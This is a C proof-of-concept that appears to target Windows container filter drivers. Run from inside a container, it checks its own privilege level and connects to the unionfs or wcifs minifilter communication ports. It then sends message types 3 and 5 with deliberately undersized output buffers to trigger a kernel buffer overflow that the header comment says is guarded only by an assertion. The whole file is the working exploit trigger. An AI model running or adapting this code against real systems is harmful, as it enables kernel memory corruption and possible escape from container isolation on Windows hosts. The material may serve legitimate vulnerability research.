// unionfs overflow test - runs inside windows container
// connects to \\UnionfsPort and sends undersized output buffer
// msg types 3 and 5 have assertion-only size check -> overflow

#include <windows.h>
#include <fltuser.h>
#include <stdio.h>

#pragma comment(lib, "fltlib.lib")
#pragma comment(lib, "advapi32.lib")

typedef struct {
    int type;
    int size;
} UFSHDR;

int main(void) {
    printf("=== unionfs overflow test (container) ===\n");

    // check priv
    HANDLE tok;
    TOKEN_ELEVATION te;
    DWORD n;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
    GetTokenInformation(tok, TokenElevation, &te, sizeof(te), &n);
    printf("admin: %s\n", te.TokenIsElevated ? "yes" : "no");

    // integrity level
    DWORD ilsz = 0;
    GetTokenInformation(tok, TokenIntegrityLevel, NULL, 0, &ilsz);
    BYTE *ilb = (BYTE*)malloc(ilsz);
    GetTokenInformation(tok, TokenIntegrityLevel, ilb, ilsz, &ilsz);
    DWORD rid = *GetSidSubAuthority(
        ((TOKEN_MANDATORY_LABEL*)ilb)->Label.Sid,
        *GetSidSubAuthorityCount(((TOKEN_MANDATORY_LABEL*)ilb)->Label.Sid) - 1);
    printf("integrity: 0x%X\n", rid);
    free(ilb);
    CloseHandle(tok);

    // try connect
    printf("\nconnecting to \\\\UnionfsPort...\n");
    HANDLE port = NULL;
    HRESULT hr = FilterConnectCommunicationPort(
        L"\\UnionfsPort", 0, NULL, 0, NULL, &port);

    if (FAILED(hr)) {
        printf("connect: 0x%08X\n", hr);
        if (hr == 0x800704D6) printf("(port not found)\n");
        if (hr == 0x80070005) printf("(access denied)\n");

        // also try wcifs port
        printf("\ntrying \\\\WcifsPort...\n");
        hr = FilterConnectCommunicationPort(
            L"\\WcifsPort", 0, NULL, 0, NULL, &port);
        if (FAILED(hr)) {
            printf("wcifsport: 0x%08X\n", hr);
        }

        if (FAILED(hr)) {
            // enumerate what filter ports exist
            printf("\nlisting loaded filters:\n");
            HANDLE flt = NULL;
            DWORD sz = 4096;
            BYTE *buf = malloc(sz);
            DWORD ret = 0;
            HRESULT hr2 = FilterFindFirst(
                FilterFullInformation, buf, sz, &ret, &flt);
            if (SUCCEEDED(hr2)) {
                FILTER_FULL_INFORMATION *fi = (FILTER_FULL_INFORMATION*)buf;
                do {
                    wprintf(L"  filter: %.*s (frame=%d)\n",
                        fi->FilterNameLength / 2, fi->FilterNameBuffer,
                        fi->FrameID);
                    hr2 = FilterFindNext(flt, FilterFullInformation, buf, sz, &ret);
                    fi = (FILTER_FULL_INFORMATION*)buf;
                } while (SUCCEEDED(hr2));
                FilterFindClose(flt);
            } else {
                printf("  FilterFindFirst: 0x%08X\n", hr2);
            }
            free(buf);
            return 1;
        }
    }

    printf("[+] connected! handle=%p\n", port);

    // send msg type 3 with small output buffer
    printf("\nsending type 3 (RemoveUnion) - small output buf...\n");
    BYTE in[256];
    memset(in, 0x41, sizeof(in));
    UFSHDR *hdr = (UFSHDR*)in;
    hdr->type = 3;
    hdr->size = 64;

    BYTE out[16];
    memset(out, 0xCC, sizeof(out));
    DWORD ret = 0;

    hr = FilterSendMessage(port, in, hdr->size, out, sizeof(out), &ret);
    printf("  result: 0x%08X, returned: %d bytes\n", hr, ret);
    printf("  out: ");
    for (int i = 0; i < 16; i++) printf("%02x ", out[i]);
    printf("\n");

    if (ret > sizeof(out)) {
        printf("[!!!] OVERFLOW: kernel wrote %d bytes into %d byte buffer\n",
            ret, (int)sizeof(out));
    }

    // type 5
    printf("\nsending type 5 (QueryUnion) - small output buf...\n");
    hdr->type = 5;
    memset(out, 0xDD, sizeof(out));
    ret = 0;

    hr = FilterSendMessage(port, in, hdr->size, out, sizeof(out), &ret);
    printf("  result: 0x%08X, returned: %d bytes\n", hr, ret);
    printf("  out: ");
    for (int i = 0; i < 16; i++) printf("%02x ", out[i]);
    printf("\n");

    if (ret > sizeof(out)) {
        printf("[!!!] OVERFLOW: kernel wrote %d bytes into %d byte buffer\n",
            ret, (int)sizeof(out));
    }

    // type 1 - CreateUnion with junk data
    printf("\nsending type 1 (CreateUnion)...\n");
    hdr->type = 1;
    hdr->size = 128;
    memset(out, 0xEE, sizeof(out));
    ret = 0;

    hr = FilterSendMessage(port, in, hdr->size, out, sizeof(out), &ret);
    printf("  result: 0x%08X, returned: %d bytes\n", hr, ret);

    CloseHandle(port);
    printf("\ndone\n");
    return 0;
}
